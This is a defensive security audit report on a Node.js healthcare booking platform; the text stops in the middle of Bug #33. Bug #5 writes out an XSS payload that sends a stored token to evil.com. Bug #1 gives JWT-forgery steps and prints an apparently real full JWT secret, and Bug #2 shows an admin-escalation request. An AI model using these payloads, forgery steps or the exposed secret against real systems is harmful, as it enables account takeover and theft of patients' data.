# NOCTURNAL Healthcare Platform - Comprehensive Bug Analysis Report

> **Generated:** 2026-03-06 | **Updated:** 2026-03-07 (consolidated all agent findings)
> **Analyst:** Claude Opus 4.6 (Automated Full-Spectrum Audit - 5 parallel analysis agents)
> **Scope:** Full codebase analysis (post Phase 1-7 fixes from Feb 15 report)
> **Total Issues Found:** 64
> **Critical:** 9 | **High:** 19 | **Medium:** 28 | **Low:** 8

---

## Table of Contents

1. [Critical Issues (P0)](#critical-issues-p0) - 9 issues
2. [High Priority Issues (P1)](#high-priority-issues-p1) - 19 issues
3. [Medium Priority Issues (P2)](#medium-priority-issues-p2) - 28 issues
4. [Low Priority Issues (P3)](#low-priority-issues-p3) - 8 issues
5. [Dangerous Exploit Chains](#dangerous-exploit-chains)
6. [Overall Risk Assessment](#overall-risk-assessment)
7. [Preventive Recommendations](#preventive-recommendations)
8. [Master Issue Index](#master-issue-index)

---

## Critical Issues (P0)

---

### Bug #1: Hardcoded JWT Secret in .env File

- **Category:** Security Bug - Sensitive Data Exposure
- **File / Location:** [.env:17](.env#L17)
- **Description:** The `.env` file contains a hardcoded JWT_SECRET (`98623d...355e`) and ENCRYPTION_KEY (`5802b4...9d4e`). While `.env` is in `.gitignore`, these are deterministic values rather than randomly generated per deployment. If this `.env` was ever committed to version control (or shared), all tokens signed with this secret are compromised.
- **Root Cause:** Static secrets shipped with the codebase instead of being generated per-environment.
- **Impact:** **Critical** - If the secret is known, an attacker can forge valid JWT tokens for any user, including admin accounts. The ENCRYPTION_KEY compromise would expose all encrypted bank details and PAN cards.
- **Reproduction Steps:**
  1. Obtain the JWT_SECRET from the .env file
  2. Use `jwt.sign({ id: '<any-user-id>' }, 'the-known-secret')` to create a valid token
  3. Access any protected endpoint with the forged token
- **Recommended Fix:**
  ```bash
  # Generate unique secrets per environment at deployment time
  openssl rand -hex 32  # For JWT_SECRET
  openssl rand -hex 32  # For ENCRYPTION_KEY
  ```
  Add a startup check in `server.js` that rejects known/default secrets in production:
  ```javascript
  if (process.env.NODE_ENV === 'production') {
    const knownBadSecrets = ['98623d6147646fb5cbe3f9d2531d4b16d91af1ef765be8651411280f7f47355e'];
    if (knownBadSecrets.includes(process.env.JWT_SECRET)) {
      throw new Error('FATAL: Default JWT_SECRET detected in production. Generate a unique secret.');
    }
  }
  ```

---

### Bug #2: Profile Update Allows Role Escalation (Mass Assignment)

- **Category:** Security Bug - Broken Access Control
- **File / Location:** [services/authService.js:189-191](services/authService.js#L189-L191)
- **Description:** The `updateProfile` method blindly copies all keys from `updateData` onto the user document. There is no whitelist of allowed fields, meaning a user can send `{ "role": "admin", "isVerified": true, "isActive": true }` in the request body to escalate their role to admin.
- **Root Cause:** Missing field whitelist in profile update logic. `Object.keys(updateData).forEach(key => { user[key] = updateData[key]; })` accepts any field.
- **Impact:** **Critical** - Any authenticated user can become an admin, verify their own account, modify internal fields like `completedDuties`, `rating`, `passwordChangedAt`, etc.
- **Reproduction Steps:**
  1. Login as any user
  2. `PUT /api/v1/auth/me` with body `{ "role": "admin" }`
  3. User is now admin with full access
- **Recommended Fix:**
  ```javascript
  async updateProfile(userId, updateData) {
    const ALLOWED_FIELDS = [
      'name', 'phone', 'location', 'professional', 'notificationSettings',
      'isAvailableForShifts', 'bankDetails'
    ];

    const user = await User.findById(userId);
    if (!user) {
      throw { statusCode: HTTP_STATUS.NOT_FOUND, message: ERROR_MESSAGE.USER_NOT_FOUND };
    }

    ALLOWED_FIELDS.forEach(key => {
      if (updateData[key] !== undefined) {
        user[key] = updateData[key];
      }
    });

    user.calculateProfileStrength();
    await user.save();
    return user;
  }
  ```

---

### Bug #3: Payment Failure Endpoint Missing Authorization Check

- **Category:** Security Bug - Broken Access Control
- **File / Location:** [services/paymentService.js:318-344](services/paymentService.js#L318-L344)
- **Description:** The `handlePaymentFailure` method does NOT verify that the requesting user owns the booking. Any authenticated patient can mark ANY booking's payment as `FAILED` by sending any valid `bookingId`.
- **Root Cause:** Unlike `createOrder`, `verifyPayment`, and `getPaymentStatus` which all check `booking.patient.toString() !== userId`, the `handlePaymentFailure` method skips this check entirely.
- **Impact:** **Critical** - An attacker can sabotage other patients' payment flows by marking their payments as FAILED, disrupting bookings and potentially causing financial discrepancies.
- **Reproduction Steps:**
  1. Login as Patient A
  2. `POST /api/v1/payments/failure` with Patient B's bookingId
  3. Patient B's payment is now marked as FAILED
- **Recommended Fix:**
  ```javascript
  async handlePaymentFailure(bookingId, error, userId) {
    const booking = await Booking.findById(bookingId);
    if (!booking) {
      throw { statusCode: HTTP_STATUS.NOT_FOUND, message: 'Booking not found' };
    }

    // Add authorization check
    if (booking.patient.toString() !== userId) {
      throw { statusCode: HTTP_STATUS.FORBIDDEN, message: 'Unauthorized access to booking' };
    }

    booking.payment.status = 'FAILED';
    booking.payment.failureReason = error?.description || 'Payment failed';
    await booking.save();
    // ...
  }
  ```
  Also update the controller call at `paymentController.js:105`:
  ```javascript
  const result = await paymentService.handlePaymentFailure(bookingId, error, req.user.id);
  ```

---

### Bug #4: Refund Endpoint Not Exposed via Route (Dead Code)

- **Category:** Functional Bug - Missing Feature
- **File / Location:** [controllers/paymentController.js:157-185](controllers/paymentController.js#L157-L185), [routes/payment.js](routes/payment.js)
- **Description:** The `processRefund` controller and service method are fully implemented but no route is defined for them. The `routes/payment.js` file only defines routes for `create-order`, `verify`, `failure`, and `status`. Admin refund functionality is unreachable.
- **Root Cause:** Route was never added for the refund endpoint.
- **Impact:** **Critical** - Admins cannot process refunds through the API. This is a core business function for a healthcare booking platform with payment processing.
- **Recommended Fix:** Add to `routes/payment.js`:
  ```javascript
  const { protect, authorize } = require('../middleware/auth');

  router.post(
    '/refund',
    protect,
    authorize('admin'),
    [
      body('bookingId')
        .notEmpty().withMessage('Booking ID is required')
        .isMongoId().withMessage('Invalid booking ID format'),
      body('amount')
        .optional()
        .isFloat({ min: 0.01 })
        .withMessage('Refund amount must be positive'),
      validate
    ],
    paymentController.processRefund
  );
  ```

---

### Bug #5: XSS via innerHTML in Client-Side Code

- **Category:** Security Bug - Cross-Site Scripting (XSS)
- **File / Location:** [client/public/app.js:259-535](client/public/app.js#L259-L535)
- **Description:** Multiple instances of `innerHTML` are set with data that may originate from the database (duty titles, application details, user names, hospital names). If any of these fields contain injected HTML/JS (e.g., `<img src=x onerror=alert(1)>`), it will execute in the browser.
- **Root Cause:** Using `innerHTML` to render dynamic content instead of `textContent` or proper DOM sanitization.
- **Impact:** **Critical** - Stored XSS can steal tokens from `localStorage`, hijack admin sessions, or perform actions as the victim. Healthcare data could be exfiltrated.
- **Reproduction Steps:**
  1. Register with name: `<img src=x onerror="fetch('https://evil.com?token='+localStorage.token)">`
  2. When an admin views the dashboard listing this user, the script executes
- **Recommended Fix:**
  - Use `textContent` for all user-supplied text
  - Use a DOM sanitization library like DOMPurify for rich content:
  ```javascript
  // Before
  dutiesList.innerHTML = html;

  // After
  import DOMPurify from 'dompurify';
  dutiesList.innerHTML = DOMPurify.sanitize(html);
  ```
  - Or better yet, build DOM elements programmatically using `createElement`/`textContent`.

---

### Bug #6: JWT Token Stored in localStorage (Token Theft via XSS)

- **Category:** Security Bug - Insecure Token Storage
- **File / Location:** [client/public/js/auth.js:52-55](client/public/js/auth.js#L52-L55)
- **Description:** JWT tokens are stored in `localStorage`, which is accessible to any JavaScript running on the page. Combined with Bug #5 (XSS), this means an attacker can steal authentication tokens.
- **Root Cause:** Using `localStorage` instead of HttpOnly cookies for token storage.
- **Impact:** **Critical** - localStorage is synchronously accessible to any JavaScript in the same origin. Any XSS vulnerability immediately becomes a full account takeover.
- **Recommended Fix:**
  - Store JWT in an HttpOnly, Secure, SameSite=Strict cookie set by the server
  - Server-side change in auth controller:
  ```javascript
  res.cookie('token', result.token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });
  ```
  - Update auth middleware to read from `req.cookies.token` as well as `Authorization` header

---

### Bug #7: Encryption Uses AES-256-CBC Without Authentication (Padding Oracle Risk)

- **Category:** Security Bug - Weak Encryption
- **File / Location:** [utils/encryption.js:4](utils/encryption.js#L4)
- **Description:** AES-256-CBC is used without HMAC authentication. This is vulnerable to padding oracle attacks where an attacker can decrypt ciphertext by manipulating the padding and observing error responses.
- **Root Cause:** Using `aes-256-cbc` instead of an authenticated encryption mode like `aes-256-gcm`.
- **Impact:** **Critical** - Bank account numbers and PAN cards encrypted with this module could potentially be decrypted through padding oracle attacks if the attacker can observe different error responses for valid vs invalid padding.
- **Recommended Fix:** Switch to AES-256-GCM (authenticated encryption):
  ```javascript
  const ALGORITHM = 'aes-256-gcm';

  exports.encrypt = (text) => {
    if (!text) return null;
    const ENCRYPTION_KEY = getEncryptionKey();
    const iv = crypto.randomBytes(12); // 96-bit IV for GCM
    const cipher = crypto.createCipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
    let encrypted = cipher.update(text.toString(), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag().toString('hex');
    return iv.toString('hex') + ':' + authTag + ':' + encrypted;
  };

  exports.decrypt = (text) => {
    if (!text) return null;
    const ENCRYPTION_KEY = getEncryptionKey();
    const parts = text.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const authTag = Buffer.from(parts[1], 'hex');
    const encrypted = parts[2];
    const decipher = crypto.createDecipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
    decipher.setAuthTag(authTag);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  };
  ```
  **Note:** Existing encrypted data will need re-encryption (the `scripts/re-encrypt-data.js` script exists for this purpose).

---

### Bug #8: Doctor Can Add Notes to Any Patient Without Access Verification

- **Category:** Security Bug - Broken Access Control
- **File / Location:** [controllers/doctorAccessController.js:105-117](controllers/doctorAccessController.js#L105-L117)
- **Description:** The `addDoctorNote` controller creates a DoctorNote for any `patientId` from the URL params without verifying that the requesting doctor has an active `HealthAccessToken` for that patient. The only check is `req.healthAccess?.bookingId` which may not be set on all routes.
- **Root Cause:** Missing explicit authorization check before creating the note. The code assumes middleware always populates `req.healthAccess` but this depends on route configuration.
- **Impact:** **Critical** - Any authenticated doctor/nurse can write medical notes to any patient's record, even patients they are not assigned to. This violates healthcare data integrity and could have medical/legal consequences.
- **Recommended Fix:**
  ```javascript
  exports.addDoctorNote = async (req, res, next) => {
    try {
      const doctorId = req.user._id;
      const { patientId } = req.params;

      // Verify doctor has active access to this patient
      const hasAccess = await doctorAccessService.canAccessPatientData(doctorId, patientId);
      if (!hasAccess) {
        return res.status(403).json({
          success: false,
          message: 'No valid access token for this patient'
        });
      }

      const DoctorNote = require('../models/doctorNote');
      const note = await DoctorNote.create({
        patient: patientId,
        doctor: doctorId,
        booking: req.healthAccess?.bookingId,
        ...noteData
      });
      // ...
    }
  };
  ```

---

### Bug #9: Messaging Endpoint Has Zero Input Validation

- **Category:** Security Bug - Missing Input Validation
- **File / Location:** [routes/messaging.js:103-155](routes/messaging.js#L103-L155)
- **Description:** The `POST /api/messages/send` endpoint accepts `recipientId`, `content`, `messageType`, `templateType`, and `dutyId` directly from `req.body` with no express-validator middleware applied. Additionally, there is no verification that the recipient exists, is active, or that the sender is permitted to message them.
- **Root Cause:** No input validation schema applied to the message creation endpoint.
- **Impact:** **Critical** - Attackers can inject invalid MongoDB ObjectIds, oversized messages, or arbitrary fields. No recipient validation means messages can be sent to non-existent accounts, creating orphaned records and potential NoSQL injection vectors.
- **Recommended Fix:**
  ```javascript
  router.post('/send',
    protect,
    [
      body('recipientId').isMongoId().withMessage('Invalid recipient ID'),
      body('content').trim().notEmpty().isLength({ max: 5000 }).withMessage('Message too long'),
      body('messageType').optional().isIn(['text', 'template', 'system']),
      body('dutyId').optional().isMongoId().withMessage('Invalid duty ID'),
      validate
    ],
    async (req, res) => {
      // Verify recipient exists and is active
      const recipient = await User.findById(req.body.recipientId);
      if (!recipient || !recipient.isActive) {
        return res.status(404).json({ success: false, message: 'Recipient not found' });
      }
      // ... rest of handler
    }
  );
  ```

---

## High Priority Issues (P1)

---

### Bug #10: Suspicious Request Detector Blocks Legitimate Medical Data

- **Category:** Behavioral Bug - False Positive Blocking
- **File / Location:** [middleware/security.js:239-263](middleware/security.js#L239-L263)
- **Description:** The `detectSuspiciousRequests` middleware checks for SQL keywords like `SELECT`, `UPDATE`, `DELETE`, `CREATE` in request bodies. In a healthcare application, medical notes frequently contain these words. The command injection check (`[;&|`$]`) blocks any string containing `$` which is common in medical contexts (e.g., "$200 consultation fee").
- **Root Cause:** Overly aggressive pattern matching on request body content without context awareness.
- **Impact:** **High** - Doctors cannot submit medical notes containing common English words.
- **Reproduction Steps:**
  1. Submit a service report with: "Select appropriate antibiotics, update dosage to 500mg"
  2. Request is blocked with 403 "Suspicious activity detected"
- **Recommended Fix:**
  ```javascript
  // Only check URL and query params, NOT body (body may contain medical text)
  const checkString = req.url + JSON.stringify(req.query);

  // More specific SQL patterns requiring SQL structure
  const sqlPattern = /(\b(SELECT\s+.+\s+FROM|INSERT\s+INTO|UPDATE\s+.+\s+SET|DELETE\s+FROM|DROP\s+(TABLE|DATABASE)|UNION\s+SELECT)\b)/gi;
  ```

---

### Bug #11: Database Reconnect Creates Infinite Event Listener Buildup

- **Category:** Resource Bug - Memory Leak
- **File / Location:** [config/database.js:115-172](config/database.js#L115-L172)
- **Description:** Every time `connectDB()` is called (including on reconnection), it registers new `error`, `disconnected`, `connected`, and `reconnected` event handlers on `mongoose.connection`. Since `disconnected` triggers recursive `setTimeout(connectDB, ...)`, each cycle adds duplicate listeners.
- **Root Cause:** Event listeners registered inside `connectDB()` which is called recursively.
- **Impact:** **High** - After multiple reconnections, hundreds of duplicate listeners accumulate, causing log spam, memory exhaustion, and exponential reconnection attempts.
- **Recommended Fix:**
  ```javascript
  let listenersRegistered = false;

  const connectDB = async () => {
    try {
      await mongoose.connect(process.env.MONGODB_URI, options);
      isConnected = true;
      reconnectAttempts = 0;

      if (!listenersRegistered) {
        mongoose.connection.on('error', (err) => { /* ... */ });
        mongoose.connection.on('disconnected', () => { /* ... */ });
        listenersRegistered = true;
      }
    }
  };
  ```

---

### Bug #12: Health Check setInterval Never Cleared on Shutdown

- **Category:** Resource Bug - Memory Leak
- **File / Location:** [config/database.js:175-182](config/database.js#L175-L182)
- **Description:** The `setInterval` for periodic health checks is created inside `connectDB()` but the interval ID is never stored, and `disconnectDB()` doesn't clear it. Multiple parallel intervals stack up on reconnections.
- **Root Cause:** Missing interval reference management.
- **Impact:** **High** - Prevents clean process shutdown. Stacked intervals produce errors after DB disconnect.
- **Recommended Fix:**
  ```javascript
  let healthCheckInterval = null;

  const connectDB = async () => {
    // ...
    if (!healthCheckInterval) {
      healthCheckInterval = setInterval(checkDatabaseHealth, HEALTH_CHECK_INTERVAL);
    }
  };

  const disconnectDB = async () => {
    if (healthCheckInterval) { clearInterval(healthCheckInterval); healthCheckInterval = null; }
    await mongoose.connection.close();
  };
  ```

---

### Bug #13: Duplicate Payment Routes (payment.js vs payments.js)

- **Category:** Integration Bug - Route Conflict / Info Leakage
- **File / Location:** [routes/payment.js](routes/payment.js) and [routes/payments.js](routes/payments.js)
- **Description:** Two separate payment route files exist: `payment.js` (Razorpay B2C) and `payments.js` (doctor earnings/legacy). The `payments.js` file uses `console.error` instead of the logger and returns raw `error.message` in responses (information leakage).
- **Root Cause:** Legacy route file not consolidated during the B2C payment refactor.
- **Impact:** **High** - Route confusion, inconsistent error handling, information leakage through `error.message`.
- **Recommended Fix:** Consolidate into a single payment routes file. Fix `payments.js` to use the logger and not expose `error.message` to clients.

---

### Bug #14: CORS Allows Null Origin (Bypass via Sandboxed iframes)

- **Category:** Security Bug - CORS Misconfiguration
- **File / Location:** [middleware/security.js:163-165](middleware/security.js#L163-L165)
- **Description:** When `origin` is `undefined`/`null`, the CORS middleware allows the request. This also allows attacks from sandboxed iframes which send null origin.
- **Root Cause:** Blanket allow for requests without an Origin header.
- **Impact:** **High** - Attackers can craft a sandboxed iframe that makes authenticated requests to the API.
- **Recommended Fix:**
  ```javascript
  origin: (origin, callback) => {
    if (!origin) {
      if (process.env.NODE_ENV === 'production') {
        return callback(new Error('Origin header required'));
      }
      return callback(null, true);
    }
    // ... rest of whitelist check
  }
  ```

---

### Bug #15: Blood Pressure Parsing Crash on Invalid Format

- **Category:** Runtime Error - Data Corruption
- **File / Location:** [services/bookingService.js:461](services/bookingService.js#L461)
- **Description:** `serviceReport.vitalsChecked.bloodPressure.split('/').map(Number)` produces `NaN` if the value doesn't contain `/`. NaN values get stored as health metrics, corrupting patient records.
- **Root Cause:** No validation of blood pressure format before parsing.
- **Impact:** **High** - NaN values stored as health metrics corrupt patient health data that doctors rely on for medical decisions.
- **Recommended Fix:**
  ```javascript
  if (serviceReport.vitalsChecked.bloodPressure) {
    const bpMatch = serviceReport.vitalsChecked.bloodPressure.match(/^(\d{2,3})\/(\d{2,3})$/);
    if (bpMatch) {
      const systolic = Number(bpMatch[1]);
      const diastolic = Number(bpMatch[2]);
      if (systolic > 0) vitals.push({ metricType: 'BP_SYSTOLIC', value: systolic, unit: 'mmHg' });
      if (diastolic > 0) vitals.push({ metricType: 'BP_DIASTOLIC', value: diastolic, unit: 'mmHg' });
    }
  }
  ```

---

### Bug #16: Provider Rating Updated to Wrong Field

- **Category:** Logic Error
- **File / Location:** [services/bookingService.js:614-616](services/bookingService.js#L614-L616)
- **Description:** The provider's average rating is saved to `professional.rating` but the User schema defines the rating field at the root level as `rating` (line 166). The `professional` subdocument has no `rating` field, so Mongoose silently ignores this update.
- **Root Cause:** Field path mismatch between the update query and the actual schema.
- **Impact:** **High** - Provider ratings are never persisted. All providers show 0 rating despite having reviews.
- **Recommended Fix:**
  ```javascript
  await User.findByIdAndUpdate(booking.serviceProvider, {
    rating: parseFloat(avgRating.toFixed(2)),
    totalReviews: providerBookings.length
  });
  ```

---

### Bug #17: File Upload Quota Check Uses Synchronous fs Operations

- **Category:** Performance Bug - Blocking I/O
- **File / Location:** [middleware/uploadEnhanced.js:82-97](middleware/uploadEnhanced.js#L82-L97)
- **Description:** `checkUserQuota` uses `fs.readdirSync` and `fs.statSync` recursively to calculate upload size. This blocks the event loop for every upload request.
- **Root Cause:** Synchronous filesystem operations in an async context.
- **Impact:** **High** - Under concurrent uploads, the entire server becomes unresponsive.
- **Recommended Fix:** Use `fs.promises.readdir` and `fs.promises.stat`, or track quota in the database instead of filesystem scanning.

---

### Bug #18: Error Handler Leaks Stack Traces and Internal Details

- **Category:** Security Bug - Information Disclosure
- **File / Location:** [middleware/errorHandler.js:2](middleware/errorHandler.js#L2), [controllers/paymentController.js:44,84](controllers/paymentController.js#L44)
- **Description:** The global error handler uses `console.error(err)`. Several controllers include `error: error.message` in JSON responses, revealing internal implementation details.
- **Root Cause:** No environment-based filtering of error details.
- **Impact:** **High** - Error messages reveal internal paths, library versions, and database details to attackers.
- **Recommended Fix:**
  ```javascript
  const errorHandler = (err, req, res, next) => {
    logger.error('Unhandled error', { message: err.message, stack: err.stack, path: req.path });
    const statusCode = err.statusCode || 500;
    const message = statusCode === 500 && process.env.NODE_ENV === 'production'
      ? 'Internal Server Error'
      : err.message || 'Server Error';
    res.status(statusCode).json({ success: false, message });
  };
  ```

---

### Bug #19: JWT Token Has No Algorithm Restriction

- **Category:** Security Bug - JWT Misconfiguration
- **File / Location:** [middleware/auth.js:24](middleware/auth.js#L24), [middleware/patientAuth.js:32](middleware/patientAuth.js#L32), [middleware/patientAuth.js:111](middleware/patientAuth.js#L111)
- **Description:** `jwt.verify(token, process.env.JWT_SECRET)` doesn't specify the `algorithms` option. This is a defense-in-depth gap against JWT algorithm confusion attacks.
- **Root Cause:** Missing `algorithms` parameter in jwt.verify across 3 locations.
- **Impact:** **High**
- **Recommended Fix:**
  ```javascript
  const decoded = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
  ```

---

### Bug #20: Race Condition in Booking Review - Rating Calculation

- **Category:** Concurrency Bug - Race Condition
- **File / Location:** [services/bookingService.js:605-616](services/bookingService.js#L605-L616)
- **Description:** After a review is saved, provider rating is calculated by fetching all rated bookings and computing the mean. Concurrent reviews both read the same set and one overwrites the other.
- **Root Cause:** Non-atomic read-compute-write pattern.
- **Impact:** **High** - Provider ratings can be incorrect.
- **Recommended Fix:**
  ```javascript
  const [result] = await NurseBooking.aggregate([
    { $match: { serviceProvider: booking.serviceProvider, 'rating.ratedAt': { $exists: true } } },
    { $group: { _id: null, avg: { $avg: '$rating.stars' }, count: { $sum: 1 } } }
  ]);
  if (result) {
    await User.findByIdAndUpdate(booking.serviceProvider, {
      rating: parseFloat(result.avg.toFixed(2)),
      totalReviews: result.count
    });
  }
  ```

---

### Bug #21: `express@5.1.0` May Have Breaking Changes

- **Category:** Compatibility Bug - Dependency Risk
- **File / Location:** [package.json:88](package.json#L88)
- **Description:** Express 5.x has breaking changes from Express 4 (changed path routing, removed `req.host`, different error handling). Several middleware packages may not be compatible.
- **Root Cause:** Major version upgrade without comprehensive compatibility verification.
- **Impact:** **High** - Potential runtime errors from incompatible middleware.
- **Recommended Fix:** Audit all middleware for Express 5 compatibility. If not all are compatible, pin to `"express": "^4.21.0"`.

---

### Bug #22: Emergency QR Endpoint Brute-Forceable

- **Category:** Security Bug - Missing Rate Limiting
- **File / Location:** [routes/doctorAccess.js:186-194](routes/doctorAccess.js#L186-L194)
- **Description:** The emergency QR endpoint `GET /api/v1/emergency/:qrToken` is public (no authentication) and only inherits global rate limits. There is no per-token or per-IP specific rate limiting.
- **Root Cause:** Public endpoint without dedicated rate limiting for a security-sensitive resource.
- **Impact:** **High** - Attackers can brute-force emergency QR tokens to access any patient's emergency health data without authentication.
- **Recommended Fix:**
  ```javascript
  const emergencyRateLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5, // 5 attempts per 15 minutes per IP
    message: 'Too many attempts'
  });
  router.get('/emergency/:qrToken', emergencyRateLimiter, emergencyAccessHandler);
  ```
  Also validate token format before database lookup to prevent blind enumeration.

---

### Bug #23: Admin Can Modify Any Hospital's Duties (Missing Hospital Scope)

- **Category:** Security Bug - Broken Access Control
- **File / Location:** [routes/duties.js:28-31](routes/duties.js#L28-L31)
- **Description:** The PUT and DELETE routes for duties validate the duty ID and check admin role, but don't verify if the admin's hospital matches the duty's hospital. Any admin can modify/delete another hospital's duties.
- **Root Cause:** Authorization only checks role, not organizational scope.
- **Impact:** **High** - Cross-hospital data manipulation by rogue admins.
- **Recommended Fix:**
  ```javascript
  // In duty update/delete controller
  const duty = await Duty.findById(req.params.id);
  if (duty.hospital.toString() !== req.user.hospital) {
    return res.status(403).json({ success: false, message: 'Cannot modify duties from another hospital' });
  }
  ```

---

### Bug #24: Refund Rollback Failure Silently Swallowed

- **Category:** Data Integrity Bug - Error Handling
- **File / Location:** [services/paymentService.js:452-469](services/paymentService.js#L452-L469)
- **Description:** When a Razorpay refund API call fails, the code attempts to rollback the booking status from `REFUND_PENDING` to `PAID`. If this rollback itself fails, the error is logged but the booking remains stuck in `REFUND_PENDING` forever with no way to recover.
- **Root Cause:** Rollback failure doesn't re-throw or trigger an alert.
- **Impact:** **High** - Booking permanently stuck in an inconsistent state. Customer can't retry payment or get a refund.
- **Recommended Fix:**
  ```javascript
  } catch (razorpayError) {
    try {
      await Booking.findByIdAndUpdate(bookingId, {
        $set: { 'payment.status': 'PAID' },
        $unset: { 'payment.refundAmount': 1 }
      });
    } catch (rollbackErr) {
      logger.error('CRITICAL: Refund rollback failed - manual intervention required', {
        bookingId, paymentId: lockedBooking.payment.paymentId, error: rollbackErr.message
      });
      // Alert operations team
      monitoring.triggerAlert('refund_rollback_failed', { bookingId });
    }
    throw { statusCode: HTTP_STATUS.BAD_GATEWAY, message: 'Refund failed. Please try again.' };
  }
  ```

---

### Bug #25: XSS in Notification Center Template Strings

- **Category:** Security Bug - Cross-Site Scripting
- **File / Location:** [client/public/js/notification-center.js:369-386](client/public/js/notification-center.js#L369-L386)
- **Description:** Notification `title` and `message` fields are inserted directly into innerHTML via template strings. If a notification contains malicious HTML (e.g., from a compromised admin or injected via the notification API), it executes in the user's browser.
- **Root Cause:** Using template string interpolation directly into innerHTML without sanitization.
- **Impact:** **High** - Stored XSS through notification content. Combined with Bug #6, leads to account takeover.
- **Recommended Fix:**
  ```javascript
  // Use textContent for user-controlled fields
  const titleEl = document.createElement('div');
  titleEl.className = 'notification-content-title';
  titleEl.textContent = notif.title;
  ```

---

### Bug #26: Open Redirect via Notification actionUrl

- **Category:** Security Bug - Open Redirect
- **File / Location:** [client/public/js/notification-center.js:423](client/public/js/notification-center.js#L423)
- **Description:** When a notification is clicked, `window.location.href = actionUrl` redirects to the URL stored in the notification without any validation. A malicious notification could redirect users to a phishing site.
- **Root Cause:** No URL validation or domain whitelist before redirect.
- **Impact:** **High** - Users can be redirected to malicious sites via crafted notifications.
- **Recommended Fix:**
  ```javascript
  if (actionUrl) {
    try {
      const url = new URL(actionUrl, window.location.origin);
      if (url.origin === window.location.origin) {
        window.location.href = actionUrl;
      } else {
        console.warn('Blocked redirect to external URL:', actionUrl);
      }
    } catch (e) {
      // Relative URL - safe
      window.location.href = actionUrl;
    }
  }
  ```

---

### Bug #27: Health Access Token Validation Failures Not Logged (HIPAA Gap)

- **Category:** Compliance Bug - Missing Audit Trail
- **File / Location:** [models/healthAccessToken.js:180-207](models/healthAccessToken.js#L180-L207)
- **Description:** The `validateToken()` static method checks expiry and usage limits but does not log failed validation attempts. In a healthcare application, all access attempts to patient data must be audited for HIPAA compliance.
- **Root Cause:** Validation logic doesn't track failed access attempts.
- **Impact:** **High** - Failed unauthorized access attempts to health data aren't logged, violating healthcare audit requirements.
- **Recommended Fix:**
  ```javascript
  static async validateToken(tokenId) {
    const token = await this.findById(tokenId);
    if (!token || token.isExpired() || token.isRevoked) {
      logger.logSecurity('health_access_token_validation_failed', {
        tokenId, reason: !token ? 'not_found' : token.isExpired() ? 'expired' : 'revoked'
      });
      return null;
    }
    logger.info('Health access token validated', { tokenId, doctorId: token.doctorId });
    return token;
  }
  ```

---

### Bug #28: Non-Atomic Booking Completion + Patient Stats Update

- **Category:** Data Integrity Bug - Race Condition
- **File / Location:** [services/bookingService.js:541-549](services/bookingService.js#L541-L549)
- **Description:** Booking completion and patient stats update (`$inc totalBookings, totalSpent`) are two separate DB operations. If the process crashes between them, booking is COMPLETED but patient stats are not updated.
- **Root Cause:** Non-atomic multi-document update pattern.
- **Impact:** **High** - Patient statistics become permanently inconsistent. No reconciliation mechanism exists.
- **Recommended Fix:** Use MongoDB transactions:
  ```javascript
  const session = await mongoose.startSession();
  session.startTransaction();
  try {
    await NurseBooking.findByIdAndUpdate(booking._id, completionUpdate, { session });
    await Patient.findByIdAndUpdate(booking.patient, {
      $inc: { totalBookings: 1, totalSpent: booking.pricing.payableAmount }
    }, { session });
    await session.commitTransaction();
  } catch (err) {
    await session.abortTransaction();
    throw err;
  } finally {
    session.endSession();
  }
  ```

---

## Medium Priority Issues (P2)

---

### Bug #29: Upload Directory Traversal - Incomplete Sanitization

- **Category:** Security Bug - Path Traversal
- **File / Location:** [app.js:222](app.js#L222)
- **Description:** Path sanitization `path.normalize(filename).replace(/^(\.\.(\/|\\|$))+/, '')` only strips leading `../`. Crafted filenames may bypass this regex.
- **Root Cause:** Regex-based path sanitization is fragile.
- **Impact:** **Medium**
- **Recommended Fix:**
  ```javascript
  const safePath = path.basename(filename);
  const filePath = path.join(__dirname, 'uploads', type, safePath);
  const uploadsRoot = path.resolve(__dirname, 'uploads', type);
  if (!path.resolve(filePath).startsWith(uploadsRoot)) {
    return res.status(400).send('Invalid filename');
  }
  ```

---

### Bug #30: No Pagination Limit Cap on Health Metrics Query

- **Category:** Performance Bug - Potential DoS
- **File / Location:** [controllers/healthDataController.js:113](controllers/healthDataController.js#L113)
- **Description:** The `limit` query parameter defaults to 50 but has no maximum cap. `?limit=999999` loads all metrics into memory.
- **Root Cause:** Missing maximum limit validation. Same pattern in [controllers/bookingController.js:69-70](controllers/bookingController.js#L69-L70).
- **Impact:** **Medium**
- **Recommended Fix:**
  ```javascript
  const options = {
    page: Math.max(1, parseInt(page) || 1),
    limit: Math.min(parseInt(limit) || 50, 100) // Cap at 100
  };
  ```

---

### Bug #31: Booking Stats Query Accepts Unsanitized Filters

- **Category:** Security Bug - NoSQL Injection Vector
- **File / Location:** [services/bookingService.js:686-710](services/bookingService.js#L686-L710)
- **Description:** `getBookingStats(filters)` passes filters directly to `countDocuments()` and `aggregate()`. Defense-in-depth needed beyond global sanitization middleware.
- **Root Cause:** Trusting filter objects without per-method validation.
- **Impact:** **Medium**
- **Recommended Fix:** Whitelist allowed filter keys in the service method.

---

### Bug #32: `updateConnectionMetrics` Missing `await` in Health Check

- **Category:** Logic Error - Async Bug
- **File / Location:** [config/database.js:56](config/database.js#L56)
- **Description:** `updateConnectionMetrics()` is called without `await`. Unhandled promise rejection could crash the process.
- **Root Cause:** Missing `await` keyword.
- **Impact:** **Medium**
- **Recommended Fix:** `await updateConnectionMetrics();`

---

### Bug #33: Booking Service Calculates Pricing with Floating Point

- **Category:** Logic Error - Financial Calculation
- **File / Location:** [services/bookingService.js:120-124](services/bookingService.js#L120-L124)
- **Description:** Pricing uses floating-point arithmetic causing rounding errors with decimal currency amounts.
- **Root Cause:** IEEE 754 floating point applied to financial calculations.
- **Impact:** **Medium** - Subtle pricing inconsistencies. Over many transactions, rounding errors accumulate.
- **Recommended Fix:** Use paise (integer cents) for all calculations:
  ```javascript
